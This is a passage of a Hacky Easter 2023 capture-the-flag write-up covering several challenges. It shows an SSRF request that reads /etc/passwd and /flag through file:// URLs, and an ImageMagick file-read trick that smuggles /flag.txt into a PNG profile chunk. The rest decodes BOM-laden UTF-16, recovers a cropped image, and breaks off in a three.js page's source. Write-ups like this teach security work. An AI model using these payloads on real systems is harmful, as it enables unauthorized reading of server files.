        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://stars:1337/star</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#cheese</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://cheese:1337/cheese</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#flag</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://flags:1337/flag</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#wine</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://wine:1337/wine</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#meals</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://meals:1337/meal</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#trek</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://trek:1337/trek</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#quotes</span><span class="dl">'</span><span class="p">).</span><span class="nf">trigger</span><span class="p">(</span><span class="dl">'</span><span class="s1">click</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>
</pre></table></code></div></div><p>So there are a couple of words you can click on, which get</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://ch.hackyeaster.com:2316/get?url=http://flags:1337/flag
</pre></table></code></div></div><p>returns</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Thank you hacker! But our flag is in another castle! ~ Bugs Bunny
</pre></table></code></div></div><p>hmm..</p><p>Let’s see what else it will serve us</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://ch.hackyeaster.com:2316/get?url=file:///etc/passwd
</pre></table></code></div></div><p>gives us the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file contents!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</pre></table></code></div></div><p>ok, so now we just need to figure out where our <code class="language-plaintext highlighter-rouge">flag</code> file is..</p><p>After overthinking for a while, thinking <code class="language-plaintext highlighter-rouge">/flag</code> referred to the location on the web and trying to find the web server config, we realize its just literally at <code class="language-plaintext highlighter-rouge">/flag</code> on the file system, and get our flag by going to <code class="language-plaintext highlighter-rouge">http://ch.hackyeaster.com:2316/get?url=file:///flag</code>, whoo!</p><h2> Flag</h2><code> he2023{4ls0-53rv3r-c4n-b3-1nj3ct3d!!!} </code><hr><h1 id="cut-off"> Cut Off <a href="/writeups/HackyEaster_2023/level3-3-cut-off.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I had a secret Easter egg on my screenshot, but I cropped it, hehe!</p><p>Kudos to former Hacky Easter winner Retr0id - he’s one of the researches who found the vulnerability in question!</p><p><img src="writeupfiles/screenshot.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This sounds like the recen <a href="https://en.wikipedia.org/wiki/ACropalypse">aCROPalypse vulnerability</a>.</p><p>We use <a href="https://acropalypse.app/">acropalypse.app</a> to recover the cropped part of the image.</p><p>We try some phone models until we have success with the “Google Pixel 6” setting</p><p><img src="writeupfiles/screenshot-recovered.png" alt="" /></p><p>we than scan the QR code to get the flag</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>zbarimg screenshot-recovered.png
QR-Code:he2023<span class="o">{</span>4cr0pa_wh4t?<span class="o">}</span>
scanned 1 barcode symbols from 1 images <span class="k">in </span>0.24 seconds

</pre></table></code></div></div><h2> Flag</h2><code> he2023{4cr0pa_wh4t?} </code><hr><h1 id="global-egg-delivery"> Global Egg Delivery <a href="/writeups/HackyEaster_2023/level3-4-global-egg-delivery.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thumper has taken great strides with the digitization of the business of distributing eggs and assorted goodies. Globalizing such a service is not without its pains and requires the additional effort to account for local customs.</p><p>Now Thumper has his message all prepared, fed through a block-chain enabled, micro-service driven, AI enhanced, zero trust translation service all that comes back is this…</p><p>Can you help Thumper decode the message?</p><p><a href="writeupfiles/message.txt">message.txt</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>By <code class="language-plaintext highlighter-rouge">cat</code>ing message.txt to the terminal we see:</p><p>Looking at the bytes,</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>$ cat message.txt | od -tx2 -a
0000000    feff    0068    fffe    6500    feff    0032    fffe    3000
        del   ~   h nul   ~ del nul   e del   ~   2 nul   ~ del nul   0
0000020    feff    0032    fffe    3300    feff    007b    fffe    7500
        del   ~   2 nul   ~ del nul   3 del   ~   { nul   ~ del nul   u
0000040    feff    0037    fffe    9201    feff    005f    fffe    6200
        del   ~   7 nul   ~ del soh dc2 del   ~   _ nul   ~ del nul   b
0000060    feff    0030    fffe    6d00    feff    0035    fffe    7300
        del   ~   0 nul   ~ del nul   m del   ~   5 nul   ~ del nul   s
0000100    feff    005f    fffe    3800    feff    0072    fffe    f115
        del   ~   _ nul   ~ del nul   8 del   ~   r nul   ~ del nak   q
0000120    feff    005f    fffe    6e00    feff    0030    fffe    3700
        del   ~   _ nul   ~ del nul   n del   ~   0 nul   ~ del nul   7
0000140    feff    005f    fffe    3800    feff    3163    fffe    7700
        del   ~   _ nul   ~ del nul   8 del   ~   c   1   ~ del nul   w
0000160    feff    0061    fffe    7900    feff    0035    fffe    5f00
        del   ~   a nul   ~ del nul   y del   ~   5 nul   ~ del nul   _
0000200    feff    0031    fffe    6700    feff    006e    fffe    3000
        del   ~   1 nul   ~ del nul   g del   ~   n nul   ~ del nul   0
0000220    feff    0072    fffe    f115    feff    0064    fffe    7d00
        del   ~   r nul   ~ del nak   q del   ~   d nul   ~ del nul   }
0000240
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">0xfeff</code> and <code class="language-plaintext highlighter-rouge">0xffe</code> are <a href="https://en.wikipedia.org/wiki/Byte_order_mark">Unicode BOMs</a>. (Namely they should appear ONLY at the start)</p><blockquote><p>The BOM character is, simply, the Unicode codepoint U+FEFF ZERO WIDTH NO-BREAK SPACE, encoded in the current encoding. Traditionally, this codepoint is just a zero-width non-breaking space that inhibits line-breaking between word-glyphs. As such, if the BOM character appears in the middle of a data stream, Unicode says it should be interpreted as a normal codepoint, not as a BOM. Since Unicode 3.2, this usage has been deprecated in favor of U+2060 WORD JOINER.[1] - https://en.wikipedia.org/wiki/Byte_order_mark</p></blockquote><p>So this is ,, incredibly invalid utf16. Fun! We can decode this manually by regexing the above into something like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>printf '\xfe\xff\x00\x68\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x65\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x32\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x30\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x32\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x33\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x7b\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x75\x00\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xfe\xff\x00\x37\x00' | iconv -f utf-16 -t utf-8 | uniname
printf '\xff\xfe\x92\x01\x00' | iconv -f utf-16 -t utf-8 | uniname
</pre></table></code></div></div><p>And then seeing the result</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>16:55:38|(main) [user@p:~/projects/ctf-writeups-galaxians/HackyEaster_2023]$ bash message.sh 2&gt;/dev/null | grep 0
        0          0  000068   68             h      LATIN SMALL LETTER H
        0          0  000065   65             e      LATIN SMALL LETTER E
        0          0  000032   32             2      DIGIT TWO
        0          0  000030   30             0      DIGIT ZERO
        0          0  000032   32             2      DIGIT TWO
        0          0  000033   33             3      DIGIT THREE
        0          0  00007B   7B             {      LEFT CURLY BRACKET
        0          0  000075   75             u      LATIN SMALL LETTER U
        0          0  000037   37             7      DIGIT SEVEN
        0          0  000192   C6 92          ƒ      LATIN SMALL LETTER F WITH HOOK
        0          0  00005F   5F             _      LOW LINE
        0          0  000062   62             b      LATIN SMALL LETTER B
        0          0  000030   30             0      DIGIT ZERO
        0          0  00006D   6D             m      LATIN SMALL LETTER M
        0          0  000035   35             5      DIGIT FIVE
        0          0  000073   73             s      LATIN SMALL LETTER S
        0          0  00005F   5F             _      LOW LINE
        0          0  000038   38             8      DIGIT EIGHT
        0          0  000072   72             r      LATIN SMALL LETTER R
        0          0  0015F1   E1 97 B1       ᗱ      CANADIAN SYLLABICS CARRIER GE
</pre></table></code></div></div><p>Pulling out that middle column manually (sorry) we get the flag:</p><h2> Flag</h2><code> he2023{u7ƒ_b0m5s_8rᗱ_n07_8ㅣway5_1gn0rᗱd} </code><hr><h1 id="flip-flop"> Flip Flop <a href="/writeups/HackyEaster_2023/level4-1-flip-flop.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This awesome service can flipflop an image!</p><p>Flag is located at: <code class="language-plaintext highlighter-rouge">/flag.txt</code></p><p>http://ch.hackyeaster.com:2310</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a service that will take an image we supply it, and return it to us flipped upside down. The hint says it uses imagemagick to do this.</p><p>This looks like an imagemagick vulnerability, and we find a useful <a href="https://www.uptycs.com/blog/denial-of-servicedos-and-arbitrary-file-read-vulnerability-in-imagemagick">article</a> on the topic that we can follow.</p><p>So we use pngcrush to generate our image (the <code class="language-plaintext highlighter-rouge">test.png</code> input image can be any png image you have lying around)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>pngcrush <span class="nt">-text</span> a Profile /flag.txt test.png
</pre></table></code></div></div><p>This creates an output image in <a href="">pngout.png</a>, and we can check the metadata is set correctly:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span>exiftool pngout.png
ExifTool Version Number         : 12.40
File Name                       : pngout.png
Directory                       : <span class="nb">.</span>
File Size                       : 2.3 MiB
File Modification Date/Time     : 2023:04:10 19:47:32+02:00

<span class="o">[</span>..]

History When                    : 2023:01:30 11:31:54+01:00
Warning                         : <span class="o">[</span>minor] Text/EXIF chunk<span class="o">(</span>s<span class="o">)</span> found after PNG IDAT <span class="o">(</span>may be ignored by some readers<span class="o">)</span>
Profile                         : /flag.txt
Image Size                      : 2732x1810
Megapixels                      : 4.9
</pre></table></code></div></div><p>We upload this to our server, and get an image back, <a href="writeupfiles/pngreturned.png">pngreturned.png</a></p><p>Frustratingly, <code class="language-plaintext highlighter-rouge">exiftool</code> doesn’t show us the <code class="language-plaintext highlighter-rouge">Raw profile type</code> metadata tag with the flag in it, but using the <code class="language-plaintext highlighter-rouge">exiv2</code> tool does:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>exiv2 <span class="nt">-pS</span> pngreturned.png                                                                                                                            <span class="o">[</span>10-04-23 19:59:30]
STRUCTURE OF PNG FILE: pngreturned.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | ............                   | 0x6e9bc480
      33 | iCCP  |     371 | icc..<span class="o">(</span>.u..+DQ..?fh.G....%...5. | 0x09d9776f
     416 | cHRM  |      32 | ..z&amp;..............u0...<span class="sb">`</span>..:..  | 0x9cba513c
     460 | bKGD  |       6 | ......                         | 0xa0bda793
     478 | pHYs  |       9 | .........                      | 0x952b0e1b
     499 | tIME  |       7 | ...../<span class="s1">'                        | 0xf75a837f
     518 | tEXt  |      94 | Raw profile type txt..txt.     | 0x633ed62f
     624 | IDAT  |   32768 | x....w\..'</span>.m<span class="o">{</span><span class="se">\.</span>.... A&amp;.<span class="nv">$.</span>.n... | 0xadc05540
   33404 | IDAT  |   32768 | ?33Q..~..g.o..B......9g<span class="se">\.</span>...Z+ | 0x807f9e28
   66184 | IDAT  |   32768 | ...5595<span class="o">==</span>.8....B.A..N..3 D.l6. | 0x82fb6bd5
   98964 | IDAT  |   32768 | .a..<span class="o">=</span>55<span class="o">}</span>... 0...j,.-b....R.@.<span class="s2">" | 0x586f7028
  131744 | IDAT  |   32768 | z*.9..Z.s....@))%...,.9.@J. .. | 0x7fd64b40
  164524 | IDAT  |   32768 | ..Z........R.....(......f.</span><span class="sb">`</span>... | 0x73e7d6f7

<span class="o">[</span>..]
</pre></table></code></div></div><p>opening in a hexeditor helps</p><p><img src="writeupfiles/flipflophex.png" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>6865323032337b316d3467332d7472346731634b2d6167613131316e7d
</pre></table></code></div></div><p>Hey, this looks like plausible hex-encoded ASCII text, let’s decode!</p><h2> Flag</h2><code> he2023{1m4g3-tr4g1cK-aga111n} </code><hr><h1 id="bouncy-not-in-the-castle"> Bouncy not in the Castle <a href="/writeups/HackyEaster_2023/level4-2-bouncy-in-the-castle.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Very bouncy, indeed, but not in a castle.</p><p>Try http://ch.hackyeaster.com:2308</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Hmm…</p><p>We get to a website where we can look around, we seem to be in a patch of grass in a town, and pastel coloured eggs drop down on us and start bouncing.</p><p>Source:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>three.js webgl - materials - cube refraction [balls]<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span>
	<span class="na">content=</span><span class="s">"width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"</span><span class="nt">&gt;</span>
<span class="nt">&lt;link</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"main.css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"background.png.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>


	<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"module"</span><span class="nt">&gt;</span>

			<span class="k">import</span> <span class="o">*</span> <span class="k">as</span> <span class="nx">THREE</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./three.module.js</span><span class="dl">'</span><span class="p">;</span>
            <span class="k">import</span> <span class="nx">Stats</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./stats.module.js</span><span class="dl">'</span><span class="p">;</span>


			<span class="kd">const</span> <span class="nx">VSTEP</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>		<span class="c1">// Speed increase per step</span>
			<span class="kd">const</span> <span class="nx">VDAMP</span> <span class="o">=</span> <span class="mf">0.98</span><span class="p">;</span>		<span class="c1">// Damping because of friction</span>
			<span class="kd">const</span> <span class="nx">EGGSIZE</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span>	<span class="c1">// egg size in pixel</span>

			<span class="kd">let</span> <span class="nx">container</span><span class="p">,</span> <span class="nx">stats</span><span class="p">;</span>

			<span class="kd">let</span> <span class="nx">camera</span><span class="p">,</span> <span class="nx">scene</span><span class="p">,</span> <span class="nx">renderer</span><span class="p">;</span>

			<span class="kd">const</span> <span class="nx">eggs</span> <span class="o">=</span> <span class="p">[];</span>

			<span class="kd">let</span> <span class="nx">mouseX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">mouseY</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

			<span class="kd">let</span> <span class="nx">windowHalfX</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
			<span class="kd">let</span> <span class="nx">windowHalfY</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>

			<span class="nb">document</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span> <span class="dl">'</span><span class="s1">mousemove</span><span class="dl">'</span><span class="p">,</span> <span class="nx">onDocumentMouseMove</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>

			<span class="c1">// Clock for smooth movement on slower PCs</span>
			<span class="kd">const</span> <span class="nx">clock</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">Clock</span><span class="p">();</span>

			<span class="nf">init</span><span class="p">();</span>
			<span class="nf">animate</span><span class="p">();</span>

			<span class="kd">function</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>

				<span class="c1">// canvas</span>
				<span class="nx">container</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span> <span class="dl">'</span><span class="s1">div</span><span class="dl">'</span> <span class="p">);</span>
				<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span> <span class="nx">container</span> <span class="p">);</span>

				<span class="c1">// stats</span>
				<span class="nx">stats</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Stats</span><span class="p">();</span>
				<span class="nx">container</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span> <span class="nx">stats</span><span class="p">.</span><span class="nx">dom</span> <span class="p">);</span>

				<span class="c1">// camera</span>
				<span class="nx">camera</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">PerspectiveCamera</span><span class="p">(</span> <span class="mi">60</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span> <span class="o">/</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">100000</span> <span class="p">);</span>
				<span class="nx">camera</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">z</span> <span class="o">=</span> <span class="mi">3200</span><span class="p">;</span>

				<span class="c1">// scene</span>
				<span class="nx">scene</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">Scene</span><span class="p">();</span>
				<span class="nx">scene</span><span class="p">.</span><span class="nx">background</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">CubeTextureLoader</span><span class="p">()</span>
					<span class="p">.</span><span class="nf">setPath</span><span class="p">(</span> <span class="dl">'</span><span class="s1">textures/cube/</span><span class="dl">'</span> <span class="p">)</span>
					<span class="p">.</span><span class="nf">load</span><span class="p">(</span> <span class="p">[</span> <span class="dl">'</span><span class="s1">posx.jpg</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">negx.jpg</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">posy.jpg</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">negy.jpg</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">posz.jpg</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">negz.jpg</span><span class="dl">'</span> <span class="p">]</span> <span class="p">);</span>

				<span class="c1">// geometry (egg)</span>
				<span class="c1">// points - (x, y) pairs are rotated around the y-axis</span>
				<span class="kd">var</span> <span class="nx">points</span> <span class="o">=</span> <span class="p">[];</span>
				<span class="kd">var</span> <span class="nx">SIZE</span> <span class="o">=</span> <span class="mi">150</span><span class="p">;</span>
				<span class="k">for</span> <span class="p">(</span> <span class="kd">var</span> <span class="nx">deg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">deg</span> <span class="o">&lt;=</span> <span class="mi">180</span><span class="p">;</span> <span class="nx">deg</span> <span class="o">+=</span> <span class="mi">6</span> <span class="p">)</span> <span class="p">{</span>
					<span class="kd">var</span> <span class="nx">rad</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">PI</span> <span class="o">*</span> <span class="nx">deg</span> <span class="o">/</span> <span class="mi">180</span><span class="p">;</span>
    				<span class="kd">var</span> <span class="nx">point</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">Vector2</span><span class="p">(</span> <span class="p">(</span> <span class="mf">0.72</span> <span class="o">+</span> <span class="p">.</span><span class="mi">08</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">cos</span><span class="p">(</span> <span class="nx">rad</span> <span class="p">)</span> <span class="p">)</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">sin</span><span class="p">(</span> <span class="nx">rad</span> <span class="p">)</span> <span class="o">*</span> <span class="nx">EGGSIZE</span><span class="p">,</span> <span class="o">-</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">cos</span><span class="p">(</span> <span class="nx">rad</span> <span class="p">)</span> <span class="o">*</span> <span class="nx">EGGSIZE</span> <span class="p">);</span> <span class="c1">// the "egg equation"</span>
    				<span class="c1">//console.log( point ); // x-coord should be greater than zero to avoid degenerate triangles; it is not in this formula.</span>
    				<span class="nx">points</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span> <span class="nx">point</span> <span class="p">);</span>
				<span class="p">}</span>
				<span class="kd">const</span> <span class="nx">eggGeometry</span> <span class="o">=</span>  <span class="k">new</span> <span class="nx">THREE</span><span class="p">.</span><span class="nc">LatheBufferGeometry</span><span class="p">(</span> <span class="nx">points</span><span class="p">,</span> <span class="mi">32</span> <span class="p">);</span>

				<span class="c1">// generate all eggs</span>
